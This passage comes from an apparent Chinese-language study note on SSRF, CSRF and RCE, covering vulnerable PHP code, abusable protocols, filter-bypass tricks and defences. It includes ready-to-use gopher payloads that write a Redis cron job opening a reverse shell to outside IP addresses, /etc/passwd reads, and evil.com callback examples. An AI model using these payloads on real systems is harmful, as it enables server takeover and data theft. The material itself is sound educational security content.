href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF-有面试相关内容</a></p><p><a href="https://blog.csdn.net/qq_43378996/article/details/124050308">SSRF漏洞原理攻击与防御-协议方面比较完善</a></p><p><a href="https://www.freebuf.com/vuls/365150.html">手把手用实战教你SSRF漏洞从入门到精通</a></p></blockquote><h4 id="2、漏洞产生"><a href="#2、漏洞产生" class="headerlink" title="2、漏洞产生"></a>2、漏洞产生</h4><h5 id="危险函数"><a href="#危险函数" class="headerlink" title="危险函数"></a>危险函数</h5><p>php中的以下函数使用不当容易导致SSRF：</p><ul><li><strong>file_get_contents()和readfile()</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br>// 传入URL地址<br><span class="hljs-variable">$url</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;url&#x27;</span>];   <br>// 从URL地址中读取指定内容，并直接输出<br><span class="hljs-built_in">echo</span> file_get_contents(<span class="hljs-variable">$url</span>);  <br>?&gt;<br></code></pre></td></tr></table></figure><blockquote><p><code>file_get_content</code>函数从用户指定的url读取整个文件内容，然后直接使用echo命令输出展现给用户。</p><p>file_put_content()函数的作用是读取文件内容或者URL地址指定的内容。</p><p>！当传入的参数是内网文件的路径时（如在原url上添加构造路径<code>ssrf.php?url=../../../../../../etc/passwd</code>），就会造成文件读取，信息泄露 。一般这种攻击与目录遍历相结合。</p></blockquote><ul><li><strong>fsockopen()</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br><span class="hljs-keyword">function</span> GetFile(<span class="hljs-variable">$host</span>,<span class="hljs-variable">$port</span>,<span class="hljs-variable">$link</span>) &#123; <br>    <span class="hljs-variable">$fp</span> = fsockopen(<span class="hljs-variable">$host</span>, intval(<span class="hljs-variable">$port</span>), <span class="hljs-variable">$errno</span>, <span class="hljs-variable">$errstr</span>, 30);   <br>    <span class="hljs-keyword">if</span> (!<span class="hljs-variable">$fp</span>) &#123; <br>        <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;<span class="hljs-variable">$errstr</span> (error number <span class="hljs-variable">$errno</span>) \n&quot;</span>; <br>    &#125; <span class="hljs-keyword">else</span> &#123; <br>        <span class="hljs-variable">$out</span> = <span class="hljs-string">&quot;GET <span class="hljs-variable">$link</span> HTTP/1.1\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Host: <span class="hljs-variable">$host</span>\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;Connection: Close\r\n\r\n&quot;</span>; <br>        <span class="hljs-variable">$out</span> .= <span class="hljs-string">&quot;\r\n&quot;</span>; <br>        fwrite(<span class="hljs-variable">$fp</span>, <span class="hljs-variable">$out</span>); <br>        <span class="hljs-variable">$contents</span>=<span class="hljs-string">&#x27;&#x27;</span>; <br>        <span class="hljs-keyword">while</span> (!feof(<span class="hljs-variable">$fp</span>)) &#123; <br>            <span class="hljs-variable">$contents</span>.= fgets(<span class="hljs-variable">$fp</span>, 1024); <br>        &#125; <br>        fclose(<span class="hljs-variable">$fp</span>); <br>        <span class="hljs-built_in">return</span> <span class="hljs-variable">$contents</span>; <br>    &#125; <br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><blockquote><p><code>fsockopen</code>函数主要实现：初始化一个套接字连接到指定主机（host）实现对用户指定url数据的获取。该函数使用socket（端口）跟服务器建立tcp连接，传输数据。</p><p><code>fsockopen</code>函数将返回一个句柄，该句柄之后可以被其它文件类函数调用（例如，fgets()、fgetss()、fwrite()、fclose()、feof()，如果调用失败，则返回false）</p><p>变量host为指定主机名，port为端口（主要根据服务而定），errstr表示错误信息将以字符串的信息返回，30为时限。</p><p>同样也是添加构造语句<code>ssrf.php?url=www.baidu.com(域名)</code>即可成功触发ssrf，并返回目标域名主页。用处不算大。</p></blockquote><ul><li><strong>curl_exec()</strong></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">&lt;?php <br><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>]))&#123;<br>    <span class="hljs-variable">$link</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;url&#x27;</span>];<br>    <span class="hljs-variable">$curlobj</span> = curl_init();// 创建新的 cURL 资源<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_POST, 0);<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>,CURLOPT_URL,<span class="hljs-variable">$link</span>);<br>    curl_setopt(<span class="hljs-variable">$curlobj</span>, CURLOPT_RETURNTRANSFER, 1);// 设置 URL 和相应的选项<br>    <span class="hljs-variable">$result</span>=curl_exec(<span class="hljs-variable">$curlobj</span>);// 抓取 URL 并把它传递给浏览器<br>    curl_close(<span class="hljs-variable">$curlobj</span>);// 关闭 cURL 资源，并且释放系统资源<br><br>    <span class="hljs-variable">$filename</span> = <span class="hljs-string">&#x27;./curled/&#x27;</span>.rand().<span class="hljs-string">&#x27;.txt&#x27;</span>;<br>    file_put_contents(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$result</span>); <br>    <span class="hljs-built_in">echo</span> <span class="hljs-variable">$result</span>;<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><blockquote><p><code>curl_exec</code>函数用于执行指定的cURL会话。cURL通过PHP获取数据，并将获取到的文件数据保存至curled文件夹下的随机文件名文本文件中。</p><p>对于<code>curl_exec</code>的攻击方式：</p><ul><li>可以通过添加构造语句<code>ssrf.php?url=www.baidu.com(域名)</code>触发其ssrf</li><li>通过<code>file、dict、gopher</code>这三个协议来进行渗透。（更常见的做法）</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl -vvv <span class="hljs-string">&#x27;file:///etc/passwd&#x27;</span> <br>curl -vvv <span class="hljs-string">&#x27;dict://127.0.0.1:6379/info&#x27;</span> <br><span class="hljs-comment"># 注意：链接使用单引号，避免$变量问题 </span><br>curl -vvv <span class="hljs-string">&#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></code></pre></td></tr></table></figure><p>其中，<code>curl</code> 是一个命令行工具，用于发送和接收数据，通常用于与网页和服务器进行交互。</p><p><code>-vvv</code> 参数表示输出详细的调试信息，有助于查看命令的执行过程和返回结果</p><p><code>dict://127.0.0.1:6379/info</code>指定使用dict协议，来模拟一个访问Redis服务的请求，后面的IP和端口号指的是本地主机地址和Redis默认的监听端口号，<code>/info</code>用于获取Redis服务器的信息和统计数据（Redis常用命令）</p><p><code>gopher</code> 是一种互联网协议，它允许通过 URL 方式进行数据传输。这里的<code>gopher://127.0.0.1:6379/</code> 指定了一个 Redis 服务器的地址和端口号。</p><p>接下来是一系列以 <code>%0d%0a</code> 结尾的数据块，这些块构成了一个特定的Redis命令序列。</p><p>有关于上述对gopher协议的利用代码主要利用了Redis未授权访问漏洞，时期允许攻击者执行任意命令，包括执行恶意代码。</p></blockquote><ul><li><strong>SoapClient类</strong></li></ul><p><a href="https://blog.csdn.net/qq_37376469/article/details/130024611">PHP中原生类SoapClient反序列化的SSRF利用</a></p><p><a href="https://blog.csdn.net/qq_42181428/article/details/100569464">利用SoapClient类进行SSRF+CRLF攻击</a></p><blockquote><p>注意情况：</p><p>1.一般情况下PHP不会开启fopen的gopher wrapper </p><p>2.file_get_contents的gopher协议不能URL编码 </p><p>3.file_get_contents关于Gopher的302跳转会出现bug，导致利用失败 </p><p>4.curl/libcurl 7.43 上gopher协议存在bug(%00截断) 经测试7.49 可用 </p><p>5.curl_exec() //默认不跟踪跳转</p><p>6.file_get_contents() // file_get_contents支持php://input协议</p></blockquote><h5 id="可利用协议"><a href="#可利用协议" class="headerlink" title="可利用协议"></a>可利用协议</h5><ul><li><strong>file协议</strong></li></ul><p>结合<code>目录遍历</code>读取文件，从文件系统中获取文件内容。如<code>file:///etc/passwd</code>，其中<code>/etc/passwd</code>是用户账户文件。</p><ul><li><strong>gopher协议</strong></li></ul><p>分布式文档传递服务，可以<code>打开端口</code>，可以使用<code>gopherus</code>生成<code>payload</code></p><ul><li><strong>dict协议</strong></li></ul><p>· 字典服务器协议，可以访问字典资源，如<code>dict:///ip:6739/info</code>，其中<code>info</code>是Redis的常用命令。</p><p>· 可以探测指纹信息，使用格式如下：</p><blockquote><p><strong>dict://ip:port/命令:命令2:命令3</strong></p><p>其中，命令是可选字段，每个命令使用冒号隔开。</p><p>例：dict://127.0.0.1:6379/set:passwd:123456</p><p>dict://127.0.0.1:6379/get:passwd 等</p><p>在实际地址栏中，这些指令的显示效果为：</p><p>ssrf.php?url=dict://127.0.0.1:6379/set:passwd:123456</p><p>ssrf.php?url=dict://127.0.0.1:22</p></blockquote><p>· 可以写入反弹shell</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145304230.png" alt="image-20240719145304230"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240719145316045.png" alt="image-20240719145316045"></p><p>· 可以用于<code>结合cURL攻击</code></p><p>· 最主要的还是进行<code>端口探测</code>！例如：dict://127.0.0.1:80</p><ul><li><strong>http/https协议</strong></li></ul><p>进行<code>内网探测</code></p><ul><li><strong>ftp协议（sftp、tftp）</strong></li></ul><p>进行<code>端口扫描</code>。</p><p>· sftp，代表SSH文件传输协议（SSH File Transfer Protocol）或安全文件传输协议（Secure File Transfer Protocol）。这是一种与SSH打包在一起的独立协议，它运行在安全连接上，并以如下类似的方式进行工作。</p><blockquote><p>在目标网站执行：</p><p><a href="http://example.com/ssrf.php?url=sftp://evil.com:9999/">http://example.com/ssrf.php?url=sftp://evil.com:9999/</a></p><p><code>evil.com</code>指代目标网站的域名或IP地址，其后冒号跟着的是自己设置的监听端口号。</p><p>在本地（如kali）终端开启监听，等待来自目标服务器的连接：</p><p>local:$ nc -lvvp 9999</p><p>Connection from [192.168.0.12] port 9999[tcp/*]<br>accepted (family 2, sport 37146)SSH-2.0-libssh2_1.4.2</p><p>nc命令的输出表明（是别人的输出捏）攻击者已经成功接受了来自目标服务器的连接，即连接被建立了。</p></blockquote><p>· tftp，（Trivial File Transfer Protocol,简单文件传输协议），是一种简单的基于lockstep机制的文件传输协议，它允许客户端从远程主机获取文件或将文件上传至远程主机。</p><blockquote><p>在目标网站执行：</p><p><a href="http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET">http://example.com/ssrf.php?url=tftp://evil.com:1337/TESTUDPPACKET</a></p><p>其中，<code>TESTUDPPACKET</code>是一个UDP数据包</p><p>local:# nc -lvup 1337<br>Listening on [0.0.0.0] (family 0, port1337)TESTUDPPACKEToctettsize0blksize512timeout3</p></blockquote><h4 id="3、漏洞利用"><a href="#3、漏洞利用" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h4><h5 id="漏洞验证方式"><a href="#漏洞验证方式" class="headerlink" title="漏洞验证方式"></a>漏洞验证方式</h5><ul><li>排除法：浏览器f12查看源代码看是否是在本地进行了请求</li><li>使用dnslog等工具进行测试，看是否被访问(可以再盲打后台，比如将当前准备请求的url和参数编码成base64，这样盲打后台解码后就知道是哪台机器哪个cgi触发的请求)</li><li>抓包分析发送的请求是不是通过服务器发送的，如果不是客户端发出的请求，则有可能是存在漏洞。接着找存在HTTP服务的内网地址：</li></ul><blockquote><p>从漏洞平台中的历史漏洞寻找泄漏的存在web应用内网地址</p><p>通过二级域名暴力猜解工具模糊猜测内网地址</p><p>通过file协议读取内网信息获取相关地址</p></blockquote><ul><li>留意bool型SSRF，通过判断两次不同请求结果的差异来判断是否存在SSRF，类似布尔型sql盲注方法</li><li>直接返回Banner、title、content等信息</li></ul><h5 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h5><p>1.可以对外网、服务器所在内网、本地进行端口扫描，获取一些服务的banner信息;</p><p>2.攻击运行在内网或本地的应用程序（比如溢出）;</p><p>3.对内网web应用进行指纹识别，通过访问默认文件实现;</p><p>4.攻击内外网的web应用，主要是使用get参数就可以实现的攻击（比如struts2，sqli等）;</p><p>5.利用file协议读取本地文件等;</p><p>6.各个协议调用探针：http,file,dict,ftp,gopher等;</p><blockquote><p>http:192.168.64.144/phpmyadmin/<br>file:///D:/<a href="http://www.txt/">www.txt</a><br>dict://192.168.64.144:3306/info<br><a href="ftp://192.168.64.144/">ftp://192.168.64.144:21</a></p></blockquote><p>7、本地利用和远程利用</p><p><a href="https://www.freebuf.com/articles/web/258449.html">ssrf知识点总结</a></p><h4 id="4、绕过方式"><a href="#4、绕过方式" class="headerlink" title="4、绕过方式"></a>4、绕过方式</h4><h5 id="绕过（http基本身份认证绕过）"><a href="#绕过（http基本身份认证绕过）" class="headerlink" title="@绕过（http基本身份认证绕过）"></a>@绕过（http基本身份认证绕过）</h5><p>使用前提：目标网站对访问的域名进行限制，且其本身存在ssrf漏洞时。</p><blockquote><p>url的完整格式为：</p><p>协议类型://访问资源需要的凭证信息@服务器地址:端口号/资源层级UNIX文件路径（精确到文件名）?查询#片段ID</p></blockquote><p>因此！</p><blockquote><p>访问<code>&lt;a href=&quot;http://baidu.com@1.1.1.1&quot;&gt;</code>、<code>http://baidu.com@1.1.1.1</code></p><p>与</p><p>访问<code>http://1.1.1.1</code></p><p>其得到的效果是一样的。因为解析的本就是@后的服务器地址。</p><p>意思就是！比如，ssrf只允许访问百度：</p><p><code>http://127.0.0.1/ssrf.php?url=https://www.baidu.com</code></p><p>我们的目标是绕过百度访问搜狗，可以使用@绕过：</p><p><code>http://127.0.0.1/ssrf.php?url=https://www.baidu.com@www.sogou.com</code></p><p>注意：在对@解析域名中，不同的处理函数存在处理差异，比如在PHP的parse_url()中会识别<code>www.sogou.com</code>，而libcurl()则识别为<code>www.baidu.com</code>。</p></blockquote><h5 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h5><blockquote><p>顾名思义，就是使用<code>进制转换</code>来进行绕过嘛！将一些关键数字参数使用<code>二进制</code>、<code>八进制</code>、<code>十六进制</code>、<code>十进制整数格式</code>进行转换。</p><p>比如，IP地址 192.168.0.1 可以被改写为：</p><p>八进制格式：0300.0250.0.1</p><p>十六进制格式：0xC0.0xA8.0.1</p><p>十进制整数格式：3232235521（第一次听说这个哈哈哈）</p></blockquote><ul><li>————————————————————————</li></ul><p>IP地址的十进制整数格式计算方法：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721391030526.png" alt="img"></p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/QQ_1721390879675.png" alt="img"></p><ul><li>————————————————————————</li></ul><h5 id="用句号-。-替换"><a href="#用句号-。-替换" class="headerlink" title="用句号"。"替换 ".""></a>用句号"。"替换 "."</h5><blockquote><p>将IP地址中各个分隔部分的“.”号均分别使用“。”替代：</p><p>例：192.168.204.128 ----> 192。168。204.128</p><p>但是执行过程中，右边的表达也会被解析为左边的表达。</p></blockquote><h5 id="xip-io-和-xip-name-绕过"><a href="#xip-io-和-xip-name-绕过" class="headerlink" title="xip.io 和 xip.name 绕过"></a>xip.io 和 xip.name 绕过</h5><p>使用前提：服务端没有先解析IP再过滤内网地址，就可以使用localhost等解析到内网的域名。（ xip.name在使用上与xip.io一致）</p><p>此外，如果php后端只使用parse_url函数中的host参数判断是否等于127.0.0.1，那么就可以使用<code>xip.io</code>、<code>nip.io</code>、<code>sslip.io</code>这些特殊网址进行绕过。</p><blockquote><p><code>xip.io</code>可以指向任意域名。所以可以将其与内网IP/域名进行绑定，使其解析到内网。</p><p>例；<code>http://127.0.0.1.xip.io/1.php</code>实际上会解析到<code>http://127.0.0.1/1.php</code></p></blockquote><h5 id="添加端口号"><a href="#添加端口号" class="headerlink" title="添加端口号"></a>添加端口号</h5><p>有些网站可能会限制子网段。因此可以在URL中目标IP地址后面使用冒号“:”添加服务端口号，常用的是，添加<code>：80</code>端口绕过。</p><h5 id="利用-绕过"><a href="#利用-绕过" class="headerlink" title="利用[::]绕过"></a>利用[::]绕过</h5><p>利用<code>[::]</code>来实现绕过。<code>http://[::]:80/</code>会解析为<code>http://127.0.0.1</code></p><h5 id="DNS-重绑（Rebinding）"><a href="#DNS-重绑（Rebinding）" class="headerlink" title="DNS 重绑（Rebinding）"></a>DNS 重绑（Rebinding）</h5><p>工具网站：<a href="https://lock.cmpxchg8b.com/rebinder.html">https://lock.cmpxchg8b.com/rebinder.html</a></p><p><a href="https://blog.csdn.net/qq_36348899/article/details/119297854">[DNS安全] 详解DNS重绑定攻击</a></p><blockquote><p>重绑逻辑：</p><p>1、判定你给的 IP 或者域名解析后的 IP 是否在黑名单中</p><p>2、若在，退出报错</p><p>3、若不在，再次访问你给的 IP 或者域名解析后的 IP；执行后续业务模块</p><p>实现效果：</p><p>拥有一个域名，其映射到两个IP。同时设置 TTL 为 0，方便两个 IP 切换。</p><p>效果类比：你访问wwfcww.xyz这个域名，第一次解析的 IP 是 192.168.0.1；而第二次解析的IP是 127.0.0.1，如此一来即可进行 SSRF 攻击。</p></blockquote><h5 id="非HTTP协议绕过"><a href="#非HTTP协议绕过" class="headerlink" title="非HTTP协议绕过"></a>非HTTP协议绕过</h5><p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。比如通过<code>gopher</code>，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。</p><p> 例，使用gopher协议对与内网的Redis服务进行攻击，可使用如下url：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">gopher://127.0.0.1:6379/_*1%0d%0a<span class="hljs-variable">$8</span>%0d%0aflushall%0d%0a*3%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$1</span>%0d%0a1%0d%0a<span class="hljs-variable">$64</span>%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$3</span>%0d%0adir%0d%0a<span class="hljs-variable">$16</span>%0d%0a/var/spool/cron/%0d%0a*4%0d%0a<span class="hljs-variable">$6</span>%0d%0aconfig%0d%0a<span class="hljs-variable">$3</span>%0d%0aset%0d%0a<span class="hljs-variable">$10</span>%0d%0adbfilename%0d%0a<span class="hljs-variable">$4</span>%0d%0aroot%0d%0a*1%0d%0a<span class="hljs-variable">$4</span>%0d%0asave%0d%0aquit%0d%0a<br></code></pre></td></tr></table></figure><p>前面讲漏洞利用的时候提到过协议渗透。请回去复习。</p><h4 id="5、漏洞防御"><a href="#5、漏洞防御" class="headerlink" title="5、漏洞防御"></a>5、漏洞防御</h4><blockquote><p>1、在内网设备上建立黑名单内网IP，禁止公开服务器的访问。</p><p>2、过滤返回信息，对响应用户请求的返回信息进行验证。</p><p>3、禁用端口banner信息。</p><p>4、禁用不必要的协议，防止file协议等。</p><p>5、根据业务需求设定URL格式。防止攻击者构建攻击语句6、统一错误信息，避免攻击者根据错误信息判断端口状态7、限制请求端口。</p></blockquote><h3 id="④CSRF跨站请求伪造"><a href="#④CSRF跨站请求伪造" class="headerlink" title="④CSRF跨站请求伪造"></a>④CSRF跨站请求伪造</h3><h4 id="1、漏洞简介-2"><a href="#1、漏洞简介-2" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><p>· csrf（xsrf），跨站请求伪造，也被称为one-click attack 或 session riding。是一种<code>挟持用户在当前已登录的web应用程序上执行非本意操作</code>的攻击方法。</p><p>· <strong>原理</strong>：黑客利用已登陆的用户，<code>诱使其访问或登陆某个早已构造好的恶意链接或页面</code>，然后在<code>用户毫不知情</code>的情况下，<code>以用户的名义完成了非用户本意的非法操作</code>。</p><p>· <strong>实现的效果</strong>：csrf跨站请求伪造的实现效果，可以理解为攻击者盗用了合法用户的身份，以其名义在恶意网站发送恶意请求，合法用户发起的恶意请求对服务器来说是合法的。</p><p>· <strong>与XSS跨站脚本攻击相比</strong>：</p><blockquote><p>XSS利用的是用户对指定网站的信任（攻击者预先将恶意代码插入网站网页中）</p><p>CSRF利用的是网站对用户网页浏览器的信任。（攻击者诱使用户点击恶意链接或页面进而向服务器发送恶意请求）</p><p>注意！</p><p>CSRF攻击中，攻击者并没有拿到用户的权限。是借用户的权限完成了攻击（“借刀杀人”）</p><p>而XSS攻击中，攻击者可以通过盗取cookie来获取用户权限进而完成破坏。（“侵占”）</p></blockquote><p>· <strong>攻击细节</strong>：</p><p>csrf（跨站请求攻击）简单来说，就是攻击者通过一些技术手段<code>欺骗</code>用户的浏览器去访问一个用户<code>曾经认证过的网站</code>并运行一些操作（如发邮件、发信息、财产操作如转账或购买商品）。由于浏览器曾经认证过，所以被访问的网站会认为是真正的用户操作而去运行。</p><p>攻击过程中利用了web中用户身份验证的漏洞：<code>简单的身份验证只能保证请求发自某个用户的浏览器，却不能保证请求本身是用户自愿发出的</code>。</p><p>典型示例：tom登陆了银行网站且没有退出，此时浏览器中包含着tom在银行的身份验证信息 ----  攻击者将伪造的转账请求包含在帖子中，并发送给tom ----  tom在银行网站保持登陆的情况下浏览帖子 ----  即会将伪造的转账请求连同身份的认证信息发送到银行网站 ----  银行网站看到身份认证信息，认为请求是tom的合法操作。</p><p>· <strong>原理总结</strong>：</p><blockquote><p>一个CSRF漏洞攻击的实现，其需要由‘几个部分’来构成：</p><p>1、首先，需要有一个漏洞存在（无需验证、任意修改后台数据、新增请求）</p><p>2、伪装数据操作请求的恶意链接或页面</p><p>3、诱使用户主动访问或登陆恶意链接，触发非法操作</p></blockquote><h4 id="2、漏洞检测"><a href="#2、漏洞检测" class="headerlink" title="2、漏洞检测"></a>2、漏洞检测</h4><ul><li><p>方法一：抓取一个正常请求的数据包，去掉referer字段后再重新提交，如果该提交还是有效的，那么基本上可以确认目标网站存在csrf漏洞。</p></li><li><p>方法二：使用专门针对csrf漏洞检测的工具进行检测，如CSRFTester，CSRF Request Builder 等。</p></li></ul><blockquote><p>CSRFTester漏洞检测工具的测试原理：首先需要抓取我们在浏览器中访问过的所有链接以及所有表单等信息，然后通过在CSRFTester中修改相应的表单等信息，重新提交，这部操作相当于伪造客户端请求。如果修改后的测试请求成功被网站服务器接受，则说明存在CSRF漏洞。</p><p>（所以这些检测工具也可以被用来执行CSRF攻击！）</p></blockquote><h4 id="3、漏洞利用-1"><a href="#3、漏洞利用-1" class="headerlink" title="3、漏洞利用"></a>3、漏洞利用</h4><p><a href="https://blog.csdn.net/wudideaqing/article/details/139678044">CSRF(跨站请求伪造)漏洞 (带靶场演示+漏洞挖掘）</a></p><h5 id="攻击方式"><a href="#攻击方式" class="headerlink" title="攻击方式"></a>攻击方式</h5><p>有以下五种：</p><blockquote><ul><li>链接点击：</li></ul><p>攻击者通过邮件、社交媒体或其它方式发送包含恶意请求的链接，并诱导用户点击。</p><ul><li>隐藏表单</li></ul><p>在恶意网站上嵌入隐藏的表单，诱导用户在不知情的情况下触发表单提交。</p><ul><li>自动提交表单</li></ul><p>在恶意网站上使用javascript自动提交包含恶意请求的表单。如，编写响应功能的POC。</p><ul><li>图像加载</li></ul><p>在恶意网站嵌入图像标签，图像URL指向目标网站的恶意请求。</p><ul><li>跨域请求</li></ul><p>利用XMLHttpRequest或Fetch API发送跨域请求。（但是这通常会被浏览器中的同源策略和CORS限制）</p><p>CORS：跨源资源共享机制。用于定义在一个域中加载的客户端web应用程序与另一个域中的资源交互方式。</p></blockquote><h4 id="4、漏洞防御"><a href="#4、漏洞防御" class="headerlink" title="4、漏洞防御"></a>4、漏洞防御</h4><ul><li><strong>检查Referer字段</strong></li></ul><p>在HTTP协议头中有一个字段叫做Referer，它记录了该HTTP请求的来源地址。在处理敏感数据请求时，Referer字段（<code>不会骗人的真实请求地址</code>）应该要和请求的地址（<code>对方声称的请求地址</code>）处于同一个域名下。</p><p>但是该由于Referer的值是由浏览器提供的，每个浏览器对于Referer字段的具体实现存在差别，因此，并不能保证浏览器自身并没有安全漏洞。</p><p><a href="https://blog.csdn.net/SongSir001/article/details/98182051">CSRF（跨站请求伪造） 漏洞与预防-有预防代码实现</a></p><ul><li><strong>在请求地址中添加token并验证</strong></li></ul><p>CSRF攻击成功的原因是：因为攻击者能够<code>伪造用户的请求</code>，且该请求中所有的用户验证信息<code>都存在于cookie</code>中，因此攻击者可以在无需知道用户验证信息的情况下直接利用用户自己的cookie来通过安全验证。</p><p>所以！抵御CSRF攻击的关键在于：<code>在请求中放入一些攻击者不能伪造的信息，并且该信息不存在于cookie当中</code>。</p><p>所以，系统开发者可以在HTTP请求中以参数的形式加入一个随机产生的token，并在该服务器上建立一个拦截器来验证这个token，如果请求中没有token或者token内容不正确，则认为可能是CSRF攻击而拒绝该请求。（这个防御手法一般是开发人员做）</p><ul><li><strong>当前用户密码验证</strong></li></ul><p>在修改关键信息时，要求当前用户输入其自身的密码，以验证当前用户身份的真伪，进而防止未授权的恶意操作。</p><ul><li><strong>SameSite Cookie 属性</strong></li></ul><p>设置 Cookie 的 SameSite 属性为 Strict 或 Lax，防止跨站请求携带 Cookie。</p><ul><li><strong>定期重置 Session ID</strong></li></ul><p>降低会话被劫持的风险，确保会话令牌的安全性。</p><h3 id="⑤RCE远程代码执行漏洞"><a href="#⑤RCE远程代码执行漏洞" class="headerlink" title="⑤RCE远程代码执行漏洞"></a>⑤RCE远程代码执行漏洞</h3><h4 id="1、漏洞简介-3"><a href="#1、漏洞简介-3" class="headerlink" title="1、漏洞简介"></a>1、漏洞简介</h4><p>RCE，远程命令执行/远程代码执行。指用户通过<code>浏览器</code>提交执行操作命令，由于服务器端没有针对执行函数做过滤，就执行了恶意命令/代码。</p><ul><li><strong>出现：</strong>应用程序<code>直接/间接</code>使用了动态执行命令/代码的危险函数，并且函数的运行参数是<code>用户可控</code>的。</li></ul><p><strong>·</strong> 远程命令执行，一般出现这种漏洞，是因为应用系统从设计上需要给用户提供指定的远程命令操作的接口。比如常见的<code>路由器</code>、<code>防火墙</code>、<code>入侵检测等设备</code>的web管理页面上，一般会给用户提供一个ping操作的web界面，用户从web界面输入目标IP，提交后后台会对该IP地址进行一次ping测试，并返回测试结果。如果设计者对该功能没有做严格的安全控制，则可能会导致攻击者通过该接口提交“意想不到”的命令。</p><p><strong>·</strong> 远程代码执行，亦是同样的道理，后台有时候会把用户的输入 作为代码的一部分进行执行。</p><ul><li><strong>原理：</strong>当用户控制命令/代码执行函数中的参数时，注入恶意系统命令到正常命令中，造成命令/代码执行攻击。</li></ul><p><strong>·</strong> RCE漏洞，可以让攻击者直接向后台服务器远程注入操作系统命令或代码，从而控制后台系统。</p><ul><li><p><strong>本质：</strong>程序设计违背了<code>数据与代码分离</code>的原则。</p></li><li><p><strong>远程命令执行和远程代码执行的区别：</strong></p></li></ul><blockquote><p>远程命令执行：一般指操作系统命令</p><p>远程代码执行：一般指的是脚本代码</p></blockquote><h4 id="2、命令拼接符"><a href="#2、命令拼接符" class="headerlink" title="2、命令拼接符"></a>2、命令拼接符</h4><h5 id="windows系统"><a href="#windows系统" class="headerlink" title="windows系统"></a>windows系统</h5><blockquote><p><code>|</code>：管道符，前面命令的输出作为后面命令的输入。如 help | more，前面help命令会输出help的所有用法选项，这些选项输入给more，进行分页展示。</p><p><code>&amp;</code>：commandA & commandB，运行命令A，然后再运行命令B。</p><p><code>||</code>：commandA || commandB，运行命令A，如果失败则运行命令B，如果成功也不再需要运行命令B了。</p><p><code>&amp;&amp;</code>：commandA && commandB，运行命令A，如果成功则运行命令B，言外之意就是运行A失败后不再运行后面的命令。</p></blockquote><h5 id="Linux系统"><a href="#Linux系统" class="headerlink" 